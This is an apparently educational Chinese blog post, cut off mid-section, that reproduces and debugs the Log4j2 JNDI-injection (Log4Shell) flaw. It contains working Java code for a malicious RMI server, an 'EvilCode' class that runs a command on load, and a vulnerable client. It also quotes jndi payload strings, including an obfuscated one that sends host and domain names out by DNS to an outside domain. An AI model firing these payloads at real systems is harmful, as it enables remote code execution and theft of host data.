<!DOCTYPE html><html lang="zh-CH" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Log4j2 漏洞复现 | The_Itach1</title><meta name="keywords" content="cve,java"><meta name="author" content="The_Itach1"><meta name="copyright" content="The_Itach1"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><meta name="description" content="Log4j2 漏洞复现刚入门web安全，简单分析了下之前比较火的Log4j2漏洞，当然肯定有些地方还是没有理解到位的。 什么是Log4Jlog4j是Apache的一个开放源代码的项目，通过使用log4j，我们可以控制日志信息输送的目的地是控制台、文件、GUI组件、甚至是套接口服务器、NT的事件记录器、UNIX Syslog守护进程等；我们也可以控制每一条日志的输出格式；通过定义每一条日志信息的级别">
<meta property="og:type" content="article">
<meta property="og:title" content="Log4j2 漏洞复现">
<meta property="og:url" content="http://example.com/2022/02/19/Log4j%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/index.html">
<meta property="og:site_name" content="The_Itach1">
<meta property="og:description" content="Log4j2 漏洞复现刚入门web安全，简单分析了下之前比较火的Log4j2漏洞，当然肯定有些地方还是没有理解到位的。 什么是Log4Jlog4j是Apache的一个开放源代码的项目，通过使用log4j，我们可以控制日志信息输送的目的地是控制台、文件、GUI组件、甚至是套接口服务器、NT的事件记录器、UNIX Syslog守护进程等；我们也可以控制每一条日志的输出格式；通过定义每一条日志信息的级别">
<meta property="og:locale" content="zh_CH">
<meta property="og:image" content="https://s2.loli.net/2022/02/19/mcDBoNOdi34ul2P.jpg">
<meta property="article:published_time" content="2022-02-19T10:38:45.000Z">
<meta property="article:modified_time" content="2022-06-10T17:43:49.047Z">
<meta property="article:author" content="The_Itach1">
<meta property="article:tag" content="cve">
<meta property="article:tag" content="java">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://s2.loli.net/2022/02/19/mcDBoNOdi34ul2P.jpg"><link rel="shortcut icon" href="/img/2.png"><link rel="canonical" href="http://example.com/2022/02/19/Log4j%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true},
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: 'Just',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  ClickShowText: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  justifiedGallery: {
    js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
    css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isanchor: false
};

var saveToLocal = {
  set: function setWithExpiry(key, value, ttl) {
    const now = new Date()
    const expiryDay = ttl * 86400000
    const item = {
      value: value,
      expiry: now.getTime() + expiryDay,
    }
    localStorage.setItem(key, JSON.stringify(item))
  },

  get: function getWithExpiry(key) {
    const itemStr = localStorage.getItem(key)

    if (!itemStr) {
      return undefined
    }
    const item = JSON.parse(itemStr)
    const now = new Date()

    if (now.getTime() > item.expiry) {
      localStorage.removeItem(key)
      return undefined
    }
    return item.value
  }
}</script><script id="config_change">var GLOBAL_CONFIG_SITE = { 
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2022-06-11 01:43:49'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(function () {  window.activateDarkMode = function () {
    document.documentElement.setAttribute('data-theme', 'dark')
    if (document.querySelector('meta[name="theme-color"]') !== null) {
      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
    }
  }
  window.activateLightMode = function () {
    document.documentElement.setAttribute('data-theme', 'light')
   if (document.querySelector('meta[name="theme-color"]') !== null) {
      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
    }
  }
  const autoChangeMode = 'false'
  const t = saveToLocal.get('theme')
  if (autoChangeMode === '1') {
    const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
    const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
    const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
    const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
    if (t === undefined) {
      if (isLightMode) activateLightMode()
      else if (isDarkMode) activateDarkMode()
      else if (isNotSpecified || hasNoSupport) {
        const now = new Date()
        const hour = now.getHours()
        const isNight = hour <= 6 || hour >= 18
        isNight ? activateDarkMode() : activateLightMode()
      }
      window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
        if (saveToLocal.get('theme') === undefined) {
          e.matches ? activateDarkMode() : activateLightMode()
        }
      })
    } else if (t === 'light') activateLightMode()
    else activateDarkMode()
  } else if (autoChangeMode === '2') {
    const now = new Date()
    const hour = now.getHours()
    const isNight = hour <= 6 || hour >= 18
    if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
    else if (t === 'light') activateLightMode()
    else activateDarkMode()
  } else {
    if (t === 'dark') activateDarkMode()
    else if (t === 'light') activateLightMode()
  }const asideStatus = saveToLocal.get('aside-status')
if (asideStatus !== undefined) {
   if (asideStatus === 'hide') {
     document.documentElement.classList.add('hide-aside')
   } else {
     document.documentElement.classList.remove('hide-aside')
   }
}})()</script><meta name="generator" content="Hexo 5.2.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" src="/img/5.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">52</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">21</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">Categories</div><div class="length-num">7</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fa fa-heartbeat"></i><span> List</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/music/"><i class="fa-fw fas fa-music"></i><span> music</span></a></li><li><a class="site-page" href="/Gallery/"><i class="fa-fw fas fa-images"></i><span> Gallery</span></a></li><li><a class="site-page" href="/movies/"><i class="fa-fw fas fa-video"></i><span> movies</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(https://s2.loli.net/2022/02/19/mcDBoNOdi34ul2P.jpg)"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">The_Itach1</a></span><span id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fa fa-heartbeat"></i><span> List</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/music/"><i class="fa-fw fas fa-music"></i><span> music</span></a></li><li><a class="site-page" href="/Gallery/"><i class="fa-fw fas fa-images"></i><span> Gallery</span></a></li><li><a class="site-page" href="/movies/"><i class="fa-fw fas fa-video"></i><span> movies</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><span class="close" id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></span></span></nav><div id="post-info"><h1 class="post-title">Log4j2 漏洞复现</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2022-02-19T10:38:45.000Z" title="Created 2022-02-19 18:38:45">2022-02-19</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2022-06-10T17:43:49.047Z" title="Updated 2022-06-11 01:43:49">2022-06-11</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Web/">Web</a></span></div><div class="meta-secondline"> <span class="post-meta-separator">|</span><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="Log4j2-漏洞复现"><a href="#Log4j2-漏洞复现" class="headerlink" title="Log4j2 漏洞复现"></a>Log4j2 漏洞复现</h1><p>刚入门web安全，简单分析了下之前比较火的Log4j2漏洞，当然肯定有些地方还是没有理解到位的。</p>
<h2 id="什么是Log4J"><a href="#什么是Log4J" class="headerlink" title="什么是Log4J"></a>什么是Log4J</h2><p>log4j是Apache的一个开放源代码的项目，通过使用log4j，我们可以控制日志信息输送的目的地是控制台、文件、GUI组件、甚至是套接口服务器、NT的事件记录器、UNIX Syslog守护进程等；我们也可以控制每一条日志的输出格式；通过定义每一条日志信息的级别，我们能够更加细致地控制日志的生成过程。最令人感兴趣的就是，这些可以通过一个配置文件来灵活地进行配置，而不需要修改应用的代码。</p>
<p>简单来讲就是记录日志的一个框架，使用比较广，功能比较多，比较方便。</p>
<p>然后我自己也尝试去用log4j-1.2.17.jar去使用下这个日志打印，但是没能成功，无论怎么配置总是会出现。</p>
<pre><code>log4j:WARN No appenders could be found for logger (MyTest).
log4j:WARN Please initialize the log4j system properly.
log4j:WARN See http://logging.apache.org/log4j/1.2/faq.html#noconfig for more info.</code></pre>
<p>但是对漏洞分析并没什么影响。</p>
<p>具体配置Log4J环境的文章可以看看这三篇文章，介绍得比较详细。</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1455713">Java中Log4J的使用教程</a></li>
<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/EVEcho/article/details/87640356">Intellij IDEA使用log4j输出日志记录完整教程</a></li>
<li><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/ccafda45bcea">Log4j.properties配置详解</a></li>
</ul>
<h2 id="Log4j2-原理"><a href="#Log4j2-原理" class="headerlink" title="Log4j2 原理"></a>Log4j2 原理</h2><h3 id="Log4j2的Lookups"><a href="#Log4j2的Lookups" class="headerlink" title="Log4j2的Lookups"></a>Log4j2的Lookups</h3><p>正常我们使用Log4j2打印日志，如下。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">login</span><span class="params">(string name)</span></span>&#123;</span><br><span class="line">  String name = <span class="string">&quot;test&quot;</span>;  <span class="comment">//表单接收name字段</span></span><br><span class="line">  logger.info(<span class="string">&quot;&#123;&#125;,登录了&quot;</span>, name); <span class="comment">//logger为log4j</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//test,登录了</span></span><br></pre></td></tr></table></figure>

<p>但是如果我们将name修改一下，成为{$java:os}，结果就会改变。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">login</span><span class="params">(string name)</span></span>&#123;</span><br><span class="line">  String name = <span class="string">&quot;$&#123;java:os&#125;&quot;</span>;  <span class="comment">//表单接收name字段</span></span><br><span class="line">  logger.info(<span class="string">&quot;&#123;&#125;,登录了&quot;</span>, name); <span class="comment">//logger为log4j</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//Windows 7 6.1 Service Pack 1，体系结构：amd64-64,登录了</span></span><br></pre></td></tr></table></figure>
<p>而照成这一原因就是Log4j2的Lookups功能，也就是查找功能，类似于一个字典，可以根据key来找到value。</p>
<p>并且提供Jndi Lookup，如下。<br><img src="https://s2.loli.net/2022/02/17/iyNdJKZ6IahGEsO.png"></p>
<p>更多Lookup，参考官方文档，<a target="_blank" rel="noopener" href="https://www.docs4dev.com/docs/zh/log4j2/2.x/all/manual-lookups.html">https://www.docs4dev.com/docs/zh/log4j2/2.x/all/manual-lookups.html</a></p>
<h3 id="JNDI注入-RMI"><a href="#JNDI注入-RMI" class="headerlink" title="JNDI注入+RMI"></a>JNDI注入+RMI</h3><p>然后我们来看看一个playload：${jndi:rmi:192.168.9.23:1099/remote}，我们需要知道</p>
<p>为什么playload是这个样子，这实际上这将设计到java安全的知识了，由于没有java经验，在看了很多文章后，只能简单总结下。</p>
<p><strong>JNDI概念</strong></p>
<p>JNDI(Java Naming and Directory Interface,Java命名和目录接口)是SUN公司提供的一种标准的Java命名系统接口，JNDI提供统一的客户端API，通过不同的访问提供者接口JNDI服务供应接口(SPI)的实现，由管理者将JNDI API映射为特定的命名服务和目录系统，使得Java应用程序可以和这些命名服务和目录服务之间进行交互。目录服务是命名服务的一种自然扩展。</p>
<p>JNDI(Java Naming and Directory Interface)是一个应用程序设计的API，为开发人员提供了查找和访问各种命名和目录服务的通用、统一的接口，类似JDBC都是构建在抽象层上。现在JNDI已经成为J2EE的标准之一，所有的J2EE容器都必须提供一个JNDI的服务。</p>
<p>JNDI可访问的现有的目录及服务有：<br>DNS、XNam 、Novell目录服务、LDAP(Lightweight Directory Access Protocol轻型目录访问协议)、 CORBA对象服务、文件系统、Windows XP/2000/NT/Me/9x的注册表、RMI、DSML v1&amp;v2、NIS。</p>
<p>以上是一段百度wiki的描述。简单点来说就相当于一个索引库，一个命名服务将对象和名称联系在了一起，并且可以通过它们指定的名称找到相应的对象。从网上文章里面查询到该作用是可以实现动态加载数据库配置文件，从而保持数据库代码不变动等。</p>
<p><strong>主要就是JNDI注入+RMI</strong></p>
<p>先看一段常见JNDI注入+RMI代码。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">package</span> com.rmi.demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">jndi</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">        String uri = <span class="string">&quot;rmi://127.0.0.1:1099/work&quot;</span>;</span><br><span class="line">        InitialContext initialContext = <span class="keyword">new</span> InitialContext();<span class="comment">//得到初始目录环境的一个引用</span></span><br><span class="line">        initialContext.lookup(uri);<span class="comment">//获取指定的远程对象</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看到，如果uri设置成这样，客户端就可能就可能会被攻击，原因是我们加了个rmi(远程方法调用 RMI)，代表可以运行在一个Java虚拟机的对象调用运行在另一个Java虚拟机上的对象的方法，所以只要我们设置好服务端的恶意方法，客户端就会去执行他，而这个过程就又设计到了JNDI的LDAP服务等一系列操作。</p>
<p>而Log4j2漏洞就是利用了其提供了提供Jndi Lookup，而且如果我们能够控制输入的name时，就可以进行利用，简单理一下流程。</p>
<ul>
<li>我们控制输入，输入playload：${jndi:rmi:192.168.9.23:1099/remote}</li>
<li>然后Log4j2打印日志时，使用logger.info(“{}”, name);</li>
<li>lookup解析jndi，客户端远端调用服务端的恶意方法(实际上这一过程比较复杂，需要对java安全有比较深入的了解)。</li>
</ul>
<p>参考文章：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/nice0e3/p/13958047.html#jndi%E6%B3%A8%E5%85%A5rmi%E5%AE%9E%E7%8E%B0%E6%94%BB%E5%87%BB">Java安全之JNDI注入</a>，<a target="_blank" rel="noopener" href="https://blog.csdn.net/hilaryfrank/article/details/121944757?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_title~default-1.queryctrv4&spm=1001.2101.3001.4242.2&utm_relevant_index=4">Log4j2注入漏洞万字剖析-汇总收藏版</a>，<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/444814529?utm_source=wechat_session&utm_medium=social&utm_oi=911728743985344512&utm_campaign=shareopn">Log4j2原理</a><br>特别是第二篇文章，详细的介绍了LDAP方式的利用过程及原理，对过程非常详细，还有图片流程。</p>
<h2 id="Log4j2-复现"><a href="#Log4j2-复现" class="headerlink" title="Log4j2 复现"></a>Log4j2 复现</h2><h3 id="配置环境"><a href="#配置环境" class="headerlink" title="配置环境"></a>配置环境</h3><p>我这里是直接下载了网上找的一个demo，相当于已经配好了环境，只是需要更改下jdk版本，jdk环境为jdk1.8.0_91。</p>
<p>然后来看看demo的代码。</p>
<p>攻击服务端，主要就是利用Reference包装了一个恶意类，然后注册到了我们指定的远端服务器，也就是127.0.0.1:1099。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> java.rmi.AlreadyBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 准备好RMI服务端，等待受害服务器访问</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RMIServer</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 本地主机上的远程对象注册表Registry的实例,默认端口1099</span></span><br><span class="line">            LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">            Registry registry = LocateRegistry.getRegistry();</span><br><span class="line">            System.out.println(<span class="string">&quot;Create RMI registry on port 1099&quot;</span>);</span><br><span class="line">            <span class="comment">//返回的Java对象</span></span><br><span class="line">            Reference reference = <span class="keyword">new</span> Reference(<span class="string">&quot;EvilCode&quot;</span>,<span class="string">&quot;EvilCode&quot;</span>,<span class="keyword">null</span>);</span><br><span class="line">            ReferenceWrapper referenceWrapper = <span class="keyword">new</span> ReferenceWrapper(reference);</span><br><span class="line">            <span class="comment">// 把远程对象注册到RMI注册服务器上，并命名为evil</span></span><br><span class="line">            registry.bind(<span class="string">&quot;evil&quot;</span>,referenceWrapper);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>恶意类，我们如果去创建一个EvilCode对象，也就是new EvilCode()，就会弹出计算器，就相当于构造函数了，一旦创建，就会执行。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 执行任意的脚本，目前的脚本会使windows服务器打开计算器</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">EvilCode</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;受害服务器将执行下面命令行&quot;</span>);</span><br><span class="line">        Process p;</span><br><span class="line"></span><br><span class="line">        String[] cmd = &#123;<span class="string">&quot;calc&quot;</span>&#125;;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            p = Runtime.getRuntime().exec(cmd);</span><br><span class="line">            InputStream fis = p.getInputStream();</span><br><span class="line">            InputStreamReader isr = <span class="keyword">new</span> InputStreamReader(fis);</span><br><span class="line">            BufferedReader br = <span class="keyword">new</span> BufferedReader(isr);</span><br><span class="line">            String line = <span class="keyword">null</span>;</span><br><span class="line">            <span class="keyword">while</span>((line=br.readLine())!=<span class="keyword">null</span>) &#123;</span><br><span class="line">                System.out.println(line);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>客户端，log4j2的日志记录引发漏洞。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.LogManager;</span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.Logger;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">log4j</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Logger logger = LogManager.getLogger(log4j.class);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//有些高版本jdk需要打开此行代码</span></span><br><span class="line">        System.setProperty(<span class="string">&quot;com.sun.jndi.ldap.object.trustURLCodebase&quot;</span>,<span class="string">&quot;true&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//模拟填写数据,输入构造好的字符串,使受害服务器打印日志时执行远程的代码 同一台可以使用127.0.0.1</span></span><br><span class="line">        String username = <span class="string">&quot;$&#123;jndi:rmi://127.0.0.1:1099/evil&#125;&quot;</span>;</span><br><span class="line">        <span class="comment">//正常打印业务日志</span></span><br><span class="line">        logger.error(<span class="string">&quot;username:&#123;&#125;&quot;</span>,username);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="调试过程"><a href="#调试过程" class="headerlink" title="调试过程"></a>调试过程</h3><p>先运行RMIServer，启动攻击服务，然后调试log4j。</p>
<h4 id="context-lookup"><a href="#context-lookup" class="headerlink" title="context.lookup"></a>context.lookup</h4><p>logger.error()f7步入后，经过调试很长一段，找到了匹配${}的地方。</p>
<p>主要是这里的toText()<br><img src="https://s2.loli.net/2022/02/18/3EVmUILnJ9WYaCA.png"><br>跟进toText()，跟到toSerializable()，会发现个for循环，其实是在看属于什么事件，是debug还是error，当i=8时，也就是我们这个样本使用的，即logger.error()。<br><img src="https://s2.loli.net/2022/02/18/FDC3x7Es2A8gKXL.png"><br>当i=8的时候步入，然后步入fomat，发现在匹配${，然后返回去掉${}的playload。<br><img src="https://s2.loli.net/2022/02/18/rac9I7UxRGC8JOE.png"><br>接下来步入replace()，然后跟到substitute()的this.resolveVariable(event, varName, buf, startPos, pos);<br><img src="https://s2.loli.net/2022/02/18/7RQh86TP4yY9GAc.png"><br>在调试几步就到了log4j2的lookup方法，这部分会根据字符‘:’的前面部分字符串从strLookupMap中判断是什么lookup，然后调用对应的Lookup方法。<br><img src="https://s2.loli.net/2022/02/19/tdR6u34sLMHANbY.png"><br>接下来调试JndiLookup()，return var6的时候f7步入，可以发现实际上是调用了this.context.lookup(name);<br><img src="https://s2.loli.net/2022/02/19/QYkTUa2jsJlc1Ey.png"></p>
<p>补充一点，上面的srtlookup包含“:-”分割jndi的方式，所以能看到<code>$&#123;$&#123;::-j&#125;$&#123;::-n&#125;$&#123;::-d&#125;$&#123;::-i&#125;:$&#123;::-l&#125;$&#123;::-d&#125;$&#123;::-a&#125;$&#123;::-p&#125;://$&#123;hostName&#125;.$&#123;env:COMPUTERNAME&#125;.$&#123;env:USERDOMAIN&#125;.$&#123;env&#125;.nsvi5sh112ksf1bp1ff2hvztn.l4j.zsec.uk</code>的一些playload，是因为::- 前面的数据会直接丢弃。<br>原文链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_42322144/article/details/121922084">https://blog.csdn.net/qq_42322144/article/details/121922084</a><br>reference：<a target="_blank" rel="noopener" href="http://www.ch4ser.top/2021/12/11/log4j2-jndi/">http://www.ch4ser.top/2021/12/11/log4j2-jndi/</a></p>
<h4 id="jndi注入"><a href="#jndi注入" class="headerlink" title="jndi注入"></a>jndi注入</h4><p>下面的过程就是jndi注入的过程了。</p>
